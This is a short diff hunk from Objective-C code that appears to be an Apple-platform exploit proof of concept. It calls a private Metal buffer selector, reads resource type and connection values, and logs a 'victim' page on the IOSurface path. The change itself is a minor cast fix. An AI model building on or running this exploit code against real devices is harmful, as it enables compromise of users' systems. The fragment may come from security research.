@@ -103,7 +103,7 @@ static NSString *P122Ret(void) {
                                               options:MTLResourceStorageModeShared
                                             deallocator:nil];
     if (!buf) { p122_log(@"[-] bytesNoCopy create failed"); return P122Ret(); }
-    void *res = (void *)[(__bridge NSObject *)buf performSelector:@selector(resourceRef)];
+    void *res = (void *)[buf performSelector:@selector(resourceRef)];
     uint32_t ty = res && g_getType ? g_getType(res) : 0;
     uint32_t conn = res && g_getConn ? g_getConn(res) : 0;
     p122_log(@"[+] victim: page=%p res=%p type=0x%x conn=0x%x (0x80 required, 0x82 = IOSurface path)",
